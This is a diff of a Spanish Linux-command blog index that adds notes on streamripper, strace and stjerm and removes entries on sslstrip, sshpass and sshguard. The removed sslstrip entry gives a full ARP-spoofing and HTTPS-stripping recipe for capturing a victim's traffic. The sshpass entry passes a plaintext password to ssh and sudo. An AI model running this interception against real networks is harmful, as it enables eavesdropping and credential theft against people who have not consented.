@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Detectar y extraer mensajes incrustados dentro de una imagen o música $ steghide embed -cf imagen.jpg -ef archivo_texto (incrustar un texto en una &hellip;">
+  <meta name="description" content="Ripear a partir de emisoras icecast (www.icecast.com) y showcast (www.showtcast.com). Crea una carpeta en el presente directorio. $ streamrippwer &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -75,6 +75,146 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/streamripper/">Streamripper</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Ripear a partir de emisoras icecast (www.icecast.com) y showcast (www.showtcast.com). Crea una carpeta en el presente directorio.</p>
+
+<blockquote><p>$ streamrippwer http://yp.shoutcast.com/sbin/tunein-station.pls?id=321414 -l 4000 (grabar durante 4000 segundos)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/strace/">Strace</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Muestra las llamadas al sistema originadas por un proceso.</p>
+
+<blockquote><p>$ strace comando</p>
+
+<p>$ strace -p PID (Por número de proceso)</p>
+
+<p>$ strace -c comando -o traza.txt (mostrar resumen de llamadas y errores durante la ejecución y redirigido a un archivo)</p></blockquote>
+
+<p>Algunas opciones:</p>
+
+<p>-f (Incluir posibles forks que haga un programa, por ejemplo httpd)</p>
+
+<p>-v (Muestra el máximo de información)</p>
+
+<p>-s 8192 (Valor de 8192 como limite de longitud de las cadenas. Por defecto 32)</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/stjerm/">Stjerm</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Consola tipo guake.</p>
+
+<blockquote><p>$ stjerm -k f12 -s left -o 70 -h 250 -w 1280 (Que aparezca pulsando F12, con barra de escroll a la izquierda, opacidad del 70% y especificando ancho y largo)</p></blockquote>
+
+<p>Algunas opciones:</p>
+
+<p>-ah (Ocultar automáticamente la ventana cuando no está enfocada)</p>
+
+<p>-bg red (Color de fondo)</p>
+
+<p>-bgimg imagen.png (Establecer una imagen de fondo)</p>
+
+<p>-fn (Tipo y tamaño de fuente)</p>
+
+<p>-fg blue (Color de la fuente)</p>
+
+<p>-p (Posición de la ventana [valores: top, bottom, left, right])</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -380,161 +520,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/sslstrip/">Sslstrip</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].</p>
-
-<p>Configuración de reenvío de paquetes IP:</p>
-
-<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
-
-<p>Envenenamiento ARP (paquete dsniff):</p>
-
-<blockquote><p># arpspoof -i eth0 -t ip_victima ip_router</p></blockquote>
-
-<p>En caso de querer atacar toda la red, solo especificar la ip router:</p>
-
-<blockquote><p># arpspoof -i eth0 ip_router</p></blockquote>
-
-<p>Redirección de puertos usando Iptables:</p>
-
-<blockquote><p># iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</p></blockquote>
-
-<p>Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar &#8220;-A&#8221; por un &#8220;-D&#8221; en el comando anterior.</p>
-
-<p>Arrancar sslstrip y ponerlo a la escucha:</p>
-
-<blockquote><p># sslstrip -k -f -l 31715 -w archivo.log</p></blockquote>
-
-<p>Visionar en tiempo real los paquetes capturados:</p>
-
-<blockquote><p>#  tail -f archivo.log</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/sshpass/">Sshpass</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya sea por tratarse de un script en el que se entra en un host remoto, se realiza alguna acción y se regresa al local o por que se precisa entrar la contraseña de forma no interactiva. Para estos casos puede ser útil este comando aunque considerando lo debil para la seguridad que entraña su uso ya que puede quedar registrado en &#8220;history&#8221;.</p>
-
-<blockquote><p>$ sshpass -f file_pas ssh -y usuario@host ifconfig (Ejecuta ifconfig en el remoto entrando como contraseña la primera palabra del archivo file_pas )</p>
-
-<p>$ sshpass -p 1234 ssh -t usuario@host &#8220;echo 1234 | sudo -S namp 192.168.1.0/24&#8221; (Ejecuta el comando &#8220;sudo nmap&#8221; en el host remoto que tiene por contraseña 1234.)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/sshguard/">Sshguard</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-27T13:56:00+01:00" pubdate data-updated="true">27-10-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Demonio que protege SSH y otros servicios contra ataques de fuerza bruta. Funciona observando los cambios en /var/log/auth.log, verificando si alguien esta fallando varias veces al autentificarse. Luego de varios errores de autentificacion (por defecto 14) el host ofensivo sera bloqueado por 7 minutos y se duplicará cada vez que el host ofensivo repita el ataque. Carece de archivo de configuración y puede complementarse con iptables:</p>
-
-<blockquote><p># iptables -A INPUT -j sshguard (Para activarlo en todos los puertos)</p>
-
-<p># iptables -A INPUT -m multiport -p tcp &#8211;destination-ports 21,22 -j sshguard (Para puertos concretos [ftp y ssh])</p></blockquote>
-
-<p>El archivo para colocar las direcciones no afectadas por sshguard:</p>
-
-<blockquote><p># nano /etc/sshguard/whitelist</p></blockquote>
-
-<p>Con el siguiente formato:</p>
-
-<pre><code>192.168.1.53 (Una ip)
-
-192.168.1.0/24 (Un rango)
-
-lapipaplena.net (Un host)
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/34/">&larr; Older</a>
@@ -550,12 +535,24 @@ lapipaplena.net (Un host)
     <section>
 <h1>Número de entradas</h1>
 	<ul>
-	<li>1332</li>
+	<li>1334</li>
 	</ul>
 </section>
 <section>
   <h1>Añadidos/modificados</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/lzma/">lzma</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/lzip/">lzip</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/gunzip/">gunzip</a>
+      </li>
     
       <li class="post">
         <a href="/blog/ts/">ts</a>
@@ -583,18 +580,6 @@ lapipaplena.net (Un host)
     
       <li class="post">
         <a href="/blog/honeyproxy/">honeyproxy</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/owl/">owl</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/date/">date</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/tty/">tty</a>
       </li>
     
   </ul>
